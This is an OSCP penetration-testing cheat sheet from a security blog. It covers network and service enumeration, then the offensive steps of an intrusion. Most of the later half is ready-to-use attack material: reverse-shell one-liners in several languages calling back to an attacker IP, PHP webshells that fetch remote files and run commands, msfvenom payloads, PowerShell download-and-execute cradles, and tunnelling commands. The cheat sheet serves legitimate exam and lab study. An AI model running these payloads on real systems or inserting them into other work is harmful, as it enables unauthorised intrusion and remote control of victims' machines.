---
title: "oscp cheatsheet noobsec"
source_url: https://www.noobsec.net/oscp-cheatsheet/
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: misc
---

**Replace $ip with target IP**

Initial scan

```
 nmap -Pn -n -vvv -oN nmap/initial $ip
```

If no ports are found, scan in parts

```
 nmap -Pn -n -vvv -p1-500 -oN nmap/partial $ip
```

Scan all ports

```
 nmap -Pn -n -vvv -p- -oN nmap/allports $ip
```

Targeted scanning

```
 nmap -Pn -n -vvv -p22,80 -oN nmap/targeted $ip
```

UDP Scanning

```
sudo nmap -Pn -n -vvv -sU -oN nmap/udp $ip
```

Automated nmap scanning (my preference is *nmapAutomator*, never missed a port)

```
# It is recommended to scan ONE IP at a time
# Do NOT overload the network
# All scans, consecutively: Quick, Targeted, UDP, All ports, Vuln scan, CVE scan, Gobuster, Nikto
 nmapAutomator ip All
```

```
 telnet ip port
 nc -nv ip port
 curl -iv $ip
```

Nmap script scanning - will reveal anonymous access

```
 nmap -Pn -n -vvv -p21 -sC -sV $ip
```

Checking anonymous access manually

```
 ftp ip
ftp> USER anonymous
ftp> PASS anonymous
```

Easy view of FTP content - Browse to:

```
ftp://$ip
```

Uploading a binary or webshell

```
ftp> binary
ftp> put file/name
```

Additional banner grabbing

```
 ssh root@$ip
```

```
# Get nameservers and domain name of the IP address
nslookup
nslookup> server $target_ip
nslookup> $target
# o/p: ns1.example.com
# Get all sub-domains
host -l -a example.com $target_ip # or ns1.example.com
```

Run [this script](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum) with following wordlist

```
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
```

Get web server, version, potential OS

```
curl -i http://ip
```

Use [Wappalyzer](https://www.wappalyzer.com/download) to identify technologies, web server, OS, database server deployed

`View-Source` of pages to find interesting comments, directories, technologies, web application being used, etc.

Finding hidden content
Scanning each sub-domain and interesting directory is a good idea

```
# Use small common wordlist first
# Use big wordlist next
# Use CMS specific wordlist if one is found
gobuster dir -u http://$ip -w /wordlist -o gobust.out
# Find technology specific content
gobuster dir -u http://$ip -w /wordlist -o gobust_php.out -x php
# Find hidden notes, readme, changelog
gobuster dir -u http://$ip -w /wordlist -o gobust_txt.out -x txt
```

Files to browse manually

```
/robots.txt
/sitemap.xml
# Make it throw an error
/doesnotexist
```

Run web server scanning

```
# Identifies CMS
# Identifies Shellshock
nikto -host $ip -o nikto.txt
```

**Web application specific scanning**
WordPress, use [API](https://wpvulndb.com/api)

```
wpscan --url http://$ip -e p,t,u --detection-mode aggressive > wpscan.log
```

Drupal, found [here](https://github.com/droope/droopescan)

```
droopescan scan drupal http://$ip -t 32
```

```
# Login
telnet $ip 110
USER test
PASS test
# List and view mails
# O/P: <mail_number> <mail_length>
list
# View mail
retr <mail_number>
quit
```

General enumeration

```
nmap -Pn -n -p139,445 --script smb-* $ip
enum4linux -a $ip
```

Enumerate hostname

```
nmblookup -A $ip
```

Get version - script available [here](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

```
./smbver.sh $ip [port]
msf>use auxiliary/scanner/smb/smb_version
```

List shares
Note: `smbmap` will state access type available, smbclient will *NOT*. To check access type using smbclient, it’s best to access each share, read a file, and write a file.

```
smbmap -H $ip
# Get share items recursively
smbmap -H $ip -R <share>
smbmap -H $ip -d <domain> -u <user> -p <password>
smbclient -L \\$ip -N
# Protocol Error?
smbclient -L \\$ip -N --option='client min protocol=NT1'
smbclient -L \\$ip -U <user>
```

Connecting to a share

```
# Anonymously
smbclient //$ip/share -N
# Authenticated
smbclient //$ip/share -U <username>
# Protocol Error?
smbclient //$ip/share -N --option='client min protocol=NT1'
```

          | MIB Values | Windows Parameters |

          | 1.3.6.1.2.1.25.1.6.0 | System Processes |

          | 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |

          | 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |

          | 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |

          | 1.3.6.1.2.1.25.6.3.1.2 | Software Name |

          | 1.3.6.1.4.1.77.1.2.25 | User Accounts |

          | 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |

```
# Brute force community strings
# echo public > community
# echo private >> community
# echo manager >> community
# for ip in $(seq 1 254);do echo 10.11.1.$ip;done > snmp-ips
onesixtyone -c community -i snmp-ips
# Enumerate entire MIB tree
snmpwalk -c public -v1 $ip
# Enumerate specific MIB Value
snmpwalk -c public -v1 $ip $MIB_Value
snmp-check $ip
```

```
# NFS < v4
# Enumerating shares available, and mount points
showmount -e $ip
showmount -a $ip
# Mounting, x = NFS Version
mount -t nfs -o vers=x $ip:<share> <local_dir>
# On target machine
# Find mount points on the target where SUID programs and scripts can be run from
mount | grep 'nosuid\|noexec'
```

```
# Netcat
[sudo] rlwrap nc -nvlp <port>
# msf multi/handler
msf(exploit/multi/handler)> set payload path/to/payload
msf(exploit/multi/handler)> set LHOST <ip> # or <interface>
msf(exploit/multi/handler)> set LPORT <port>
```

Credit to [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
# bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1"
# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# PHP
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i &3 2>&3");'
# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",443).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'
# Netcat : -u for UDP
nc [-u] 10.10.10.10 443 -e /bin/bash
# Netcat without -e : -u for UDP
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [-u] 10.10.10.10 443 > /tmp/f
# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5/dev/tcp/10.10.10.10/443;cat &5 >&5; done"] as String[])
p.waitFor()
```

PHP reverse shell available [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) or locally
`/usr/share/webshells/php/php-reverse-shell`

Python PTY shells available [here](https://github.com/infodox/python-pty-shells)

PowerShell reverse shell available [here](https://github.com/samratashok/nishang)
PHP reverse shell available [here](https://github.com/Dhayalanb/windows-php-reverse-shell)
Netcat for Windows available [here](https://eternallybored.org/misc/netcat/)

```
# PowerShell
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
vi shell.ps1
# go to end of file, paste the following
Invoke-PowerShellTcp -Reverse -IPAddress [attacker_ip] -Port [attacker_port]
# close, reverse shell ready to use
# Netcat - use x64 or x32 as per target. powershell.exe or cmd.exe
nc.exe x.x.x.x <port> -e powershell.exe
```

```
# Basic. system() or shell_exec() or exec()
<?php system($_GET['cmd']);?>
# More functional
<?php
$ip = 'http://10.10.14.4/' # [:port] . Change this
# Upload
if (isset($_GET['fupload'])) {
    file_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload']));
};
# Execute code
# shell_exec() or system() or exec()
if (isset($_GET['cmd'])) {
    echo "<pre>" . exec($_GET['cmd']) . "</pre>";
};
?>
```

```
# Linux reverse shell - Staged
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell
# Linux reverse shell - Stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell
# Windows reverse shell - Staged
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
# Windows reverse shell - Stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
```

```
# PHP
msfvenom -p php/reverse_php
# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o shell.aspx
# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp
# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

Select appropriate architecture

```
# Linux Staged - use python or c
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python
# Linux Stageless - use python or c
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python
# Windows Staged - use python or c
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python
# Windows Stageless - use python or c
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python
```

*Upon initial access, it is crucial to achieve the highest functional shell possible for privesc purposes!*

```
# On victim machine
which python[3]
python[3] -c 'import pty;pty.spawn("/bin/bash")'
# background the listener using ctrl+z
stty -a # notice the number of rows and columns
stty raw -echo
# foreground the process: type fg, press enter
stty rows xx
stty columns xxx
export TERM=xterm-256color
```

```
# HTTP - Apache2
# cp file /var/www/html/file_name
sudo service apache2 start
# HTTP - Python. Default port 8000
# python2
sudo python -m SimpleHTTPServer 80
# python3
sudo python3 -m http.server 80
# SMB
sudo impacket-smbserver <share_name> <path/to/share>
# FTP
# apt-get install python-pyftpdlib
sudo python -m pyftpdlib -p 21
# TFTP (UDP)
sudo atftpd --daemon -port 69 /path/to/serve
# Netcat
nc -nvlp <port> < file/to/send
```

```
# Wget
wget http://<ip>/file_name -O /path/to/save/file
# Netcat
nc -nv <ip> <port> > file/to/recv
# cURL
curl http://<ip>/file_name --output file_name
```

```
# Does not save file on the system
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file_name>')"
# Saves file on the system
powershell.exe -nop -ep bypass -c "iwr -uri http://<ip>/<file_name> -outfile path/to/save/file_name"
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://<ip>/<file_name>','path/to/save/file_name')"
certutil.exe -urlcache -split -f http://<ip>/file file_save
```

```
* Wget.ps1
```

```
echo $storageDir = $pwd >> wget.ps1
$webclient = New-Object System.Net.WebClient >> wget.ps1
# Download file from
$url = "http://<ip>/file_name" >> wget.ps1
# Save file as
$file = "file_name"
echo $webclient.DownloadFile($url,$file) >>wget.ps1
# execute the script as follows
powershell.exe -nop -ep bypass -nol -noni -f wget.ps1
```

```
tftp -i <ip> get file_name
```

```
# cmd.exe
net use Z: \\<attacker_ip>\share_name
# To access the drive
Z:
# PowerShell
New-PSDrive -Name "notmalicious" -PSProvider "FileSystem" -Root "\\attacker_ip\share_name"
# To access the drive
notmalicious:
```

```
ftp <ip>
ftp>binary
ftp>get file_name
# One-liner downloader
# in cmd.exe do not use quotes in an echo command
echo open <ip> >> download.txt
echo anonymous >> download.txt
echo anon >> download.txt
echo binary >> download.txt
get file_name >> download.txt
bye >> download.txt
ftp -s:download.txt
```

```
ssh <gateway> -L <local_port_to_listen_to>:<remote_host>:<remote_port>
```

```
ssh <gateway> -R <remote_port>:<local_host>:<local_port>
```

```
ssh -D <local proxy port> -p <remote port> <target>
```

Chisel is a port forwarding tool for Linux as well as Windows, works over HTTP and can be found [here](https://github.com/jpillora/chisel).

```
# On KALI
./chisel server --reverse --port 9001
# On Windows
.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
```

Local enumeration + privilege escalation available [here](/privesc-windows/)

Local enumeration + privilege escalation available [here](/privesc-linux/)
